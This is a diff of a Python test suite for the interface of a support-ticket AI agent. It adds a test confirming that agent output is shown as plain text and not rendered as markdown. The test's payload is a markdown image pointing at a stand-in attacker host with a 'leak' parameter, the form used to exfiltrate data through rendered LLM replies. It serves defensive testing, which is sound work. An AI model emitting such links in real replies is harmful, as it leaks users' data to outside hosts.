@@ -49,8 +49,8 @@ def test_sent_ticket_shows_result_and_trace(fake_agent):
     assert not at.exception
     assert "SEND" in at.success[0].value
     assert at.metric[0].value == "billing"
-    assert any("Your refund is on its way." in m.value for m in at.markdown)
-    assert any("Classified intent" in m.value for m in at.markdown)
+    assert any("Your refund is on its way." in t.value for t in at.text)
+    assert any("Classified intent" in t.value for t in at.text)
 
 
 def test_escalated_ticket_shows_error_banner(fake_agent):
@@ -79,3 +79,15 @@ def test_empty_ticket_warns_instead_of_running(fake_agent):
 
     assert "Paste a ticket first." in at.warning[0].value
     assert "result" not in at.session_state
+
+
+def test_llm_output_is_not_rendered_as_markdown(fake_agent, monkeypatch):
+    payload = "Thanks! ![x](https://attacker.example/pixel.png?leak=1)"
+    original = fake_agent.invoke
+    monkeypatch.setattr(fake_agent, "invoke", lambda state: {
+        **original(state), "drafted_response": payload, "reasoning_trace": [payload]})
+
+    at = run_ticket()
+
+    assert not any("attacker.example" in m.value for m in at.markdown)
+    assert sum(payload in t.value for t in at.text) == 2  # reply + trace, verbatim
